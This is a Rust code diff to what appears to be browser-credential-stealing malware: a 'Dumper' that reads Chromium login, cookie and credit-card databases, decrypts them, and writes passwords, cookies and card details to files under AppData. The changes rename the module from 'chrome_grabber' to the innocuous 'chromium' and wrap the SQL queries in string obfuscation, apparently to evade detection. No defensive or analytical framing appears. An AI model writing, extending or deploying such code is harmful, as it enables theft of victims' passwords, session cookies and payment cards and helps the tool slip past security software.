@@ -1,6 +1,6 @@
-use crate::chrome_grabber::decryption_core::crypt_unprotect_data;
-use crate::chrome_grabber::main::DumperResult;
-use crate::chrome_grabber::models::{
+use crate::chromium::decryption_core::crypt_unprotect_data;
+use crate::chromium::main::DumperResult;
+use crate::chromium::models::{
     ChromeAccount, ChromeCookie, CreditCard, DecryptedAccount, DecryptedCookie,
     DecryptedCreditCard, LocalState,
 };
@@ -11,6 +11,7 @@ use std::fs::File;
 use std::io::{BufReader, Read};
 use std::path::PathBuf;
 use std::{fmt, fs};
+use obfstr::obfstr;
 
 impl From<rusqlite::Error> for DumperError {
     fn from(e: rusqlite::Error) -> Self {
@@ -41,16 +42,7 @@ pub struct Dumper {
     pub creditcards: Vec<DecryptedCreditCard>,
 }
 
-impl Debug for Dumper {
-    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        f.debug_struct("Dumper")
-            .field("app_info", &self.app_info)
-            .field("accounts", &self.accounts)
-            .field("cookies", &self.cookies)
-            .field("creditcards", &self.creditcards)
-            .finish()
-    }
-}
+
 
 impl Dumper {
     pub fn new(name: &'static str, author: &'static str) -> Self {
@@ -70,7 +62,6 @@ impl Dumper {
 }
 
 impl Dumper {
-    const STMT: &'static str = "SELECT action_url, username_value, password_value FROM logins";
 
     /// Look for the local_state file
     fn find_browser_local_state(&self) -> DumperResult<PathBuf> {
@@ -159,7 +150,7 @@ impl Dumper {
     fn query_accounts(&self) -> DumperResult<Vec<ChromeAccount>> {
         let db_url = self.cp_login_db()?;
         let conn = Connection::open(db_url)?;
-        let mut stmt = conn.prepare(Self::STMT)?;
+        let mut stmt = conn.prepare(obfstr::obfstr!("SELECT action_url, username_value, password_value FROM logins"))?;
 
         let chrome_accounts = stmt
             .query_map([], |row| {
@@ -175,7 +166,7 @@ impl Dumper {
     fn query_creditcard(&self) -> DumperResult<Vec<CreditCard>> {
         let db_url = self.cp_creditcard_database()?;
         let conn = Connection::open(db_url)?;
-        let mut stmt = conn.prepare("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards")?;
+        let mut stmt = conn.prepare(obfstr!("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards"))?;
 
         let chrome_accounts: Vec<CreditCard> = stmt
             .query_map([], |row| {
@@ -197,7 +188,7 @@ impl Dumper {
         let db_url = self.cp_cookies_db()?;
         let conn = Connection::open(db_url)?;
         let mut stmt = conn.prepare(
-            "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies",
+            obfstr!("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies"),
         )?;
 
         let chrome_accounts = stmt
@@ -387,7 +378,7 @@ impl Dumper {
 
         if text.as_bytes().len() > 15 {
             std::fs::File::create(format!(
-                "{}\\logsxc\\passwords_{}.txt",
+                "{}\\logscx\\passwords_{}.txt",
                 appdata, self.app_info.author
             ))
             .unwrap()
@@ -396,7 +387,7 @@ impl Dumper {
         }
         if text2.as_bytes().len() > 15 {
             std::fs::File::create(format!(
-                "{}\\logsxc\\cookies_{}.txt",
+                "{}\\logscx\\cookies_{}.txt",
                 appdata, self.app_info.author
             ))
             .unwrap()
@@ -405,7 +396,7 @@ impl Dumper {
         }
         if text3.as_bytes().len() > 15 {
             std::fs::File::create(format!(
-                "{}\\logsxc\\creditcards_{}.txt",
+                "{}\\logscx\\creditcards_{}.txt",
                 appdata, self.app_info.author
             ))
             .unwrap()
